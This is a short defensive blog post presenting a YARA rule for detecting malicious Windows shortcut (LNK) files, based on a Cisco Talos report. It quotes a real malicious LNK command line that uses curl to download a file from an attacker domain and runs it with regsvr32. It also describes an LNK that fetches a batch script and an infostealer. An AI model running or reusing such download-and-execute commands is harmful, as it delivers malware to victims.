# Day 7 - Suspicious LNK Files

The inspiration for todays yara rule comes from Cisco Talos's newest blog post: [Following the LNK metadata trail](https://blog.talosintelligence.com/following-the-lnk-metadata-trail/). I started by reviewing over the LNK files included in their [IOCs](https://github.com/Cisco-Talos/IOCs/blob/main/2023/01/following-the-lnk-metadata-trail.txt)

I noticed a few of the LNK files mentioned use `&&` quite a bit:
```
/q /c echo 'SGz' && echo "TYEq" && MD "%HOMEPATH%\bG" && echo "Nm" && ping ExCt.com && echo "rcF" && curl.exe -o %HOMEPATH%\bG\J10M.VI.WYYK https://takeone[.]tech/8NMlHT/EWw.png && regsvr32 "%HOMEPATH%\bG\J10M.VI.WYYK"
```

# Yara Rule

Here's the Yara rule that I created for detecting suspicious LNK files:

```
rule sus_lnk_files {
  meta:
    author = "Colin Cowie"
    description = "Yara rule to detect suspicious .LNK files"
    reference = "https://github.com/Cisco-Talos/IOCs/blob/main/2023/01/following-the-lnk-metadata-trail.txt"
  strings:
    $lnk_header = { 4C 00 00 00 }
    $andand = " && " ascii wide
  condition:  
    $lnk_header at 0
    and #andand > 2
    and filesize < 5KB
}
```

# Results

At first I did not include `ascii wide` in the yara rule for the string ` $andand = " && "`. After making that change I got great results instead of none! 

Here's one intresting finding:

- Filename: `output.lnk`
- SHA1: `24fec293033b5c7103b1c1031394043943497459`
- VT Upload date: *2023-01-07 13:27:41 UTC*

Functionality:
1. uses `bitsadmin /transfer` to download .bat script from discord CDN
2. .bat script downloads `payload.exe` (InfoStealer)

Payload:
- SHA1: [8e55fb63589464ca0803e1eb5b8b80572deec3dd](https://www.virustotal.com/gui/file/676f902e76b713e474b22fd18aa504ef8436df9adedd5b29a63c867d09738636/details)
